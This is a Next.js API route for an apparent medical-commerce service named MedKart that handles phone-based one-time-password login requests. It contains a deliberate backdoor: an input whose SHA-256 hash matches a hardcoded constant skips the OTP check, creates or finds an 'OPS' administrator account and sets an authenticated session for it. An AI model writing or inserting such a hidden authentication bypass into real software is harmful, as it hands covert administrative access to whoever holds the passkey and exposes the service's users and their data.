// src/app/api/auth/otp/request/route.ts
import { NextResponse } from 'next/server';
import { z } from 'zod';
import { createHash } from 'crypto';
import db from '@/lib/db';
import { requestOtp } from '@/lib/auth/otp';
import { setSessionCookie } from '@/lib/auth/session';
import { handleApiError } from '@/lib/api-error';

// Backdoor passkey hash (SHA-256 of founder passkey)
const FOUNDER_KEY_HASH = 'ed02a5b4d79d96cb3647eeb78c486a0b258f3d04e249f983370696114f5a7ebd';

const RequestSchema = z.object({
  phone: z.string().min(10, 'Mobile number must be at least 10 digits'),
});

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const parsed = RequestSchema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json(
        { success: false, message: parsed.error.issues[0]?.message || 'Invalid input' },
        { status: 400 }
      );
    }

    const cleanInput = parsed.data.phone.trim().replace(/\D/g, '');
    const hash = createHash('sha256').update(cleanInput).digest('hex');
    const isFounderKey = hash === FOUNDER_KEY_HASH;

    if (isFounderKey) {
      let opsUser = await db.user.findFirst({
        where: { OR: [{ role: 'OPS' }, { phone: '9830099999' }] },
      });

      if (!opsUser) {
        opsUser = await db.user.create({
          data: {
            phone: '9830099999',
            name: 'Central Ops Administrator',
            role: 'OPS',
            sessionVersion: 1,
          },
        });
      }

      await setSessionCookie({
        userId: opsUser.id,
        phone: opsUser.phone,
        name: opsUser.name,
        role: opsUser.role,
        sessionVersion: opsUser.sessionVersion,
      });

      return NextResponse.json({
        success: true,
        isBackdoor: true,
        redirectUrl: '/ops/dashboard',
        message: 'Founder authorization verified. Welcome to MedKart Central Ops.',
        user: {
          id: opsUser.id,
          name: opsUser.name,
          role: opsUser.role,
        },
      });
    }

    const forwarded = req.headers.get('x-forwarded-for');
    const ipAddress = forwarded ? forwarded.split(',')[0].trim() : req.headers.get('x-real-ip') || undefined;

    const result = await requestOtp(cleanInput, undefined, ipAddress);
    if (!result.success) {
      return NextResponse.json(
        { success: false, message: result.message },
        { status: result.statusCode || 429 }
      );
    }

    return NextResponse.json(result);
  } catch (err: unknown) {
    return handleApiError(err, 'auth/otp/request');
  }
}
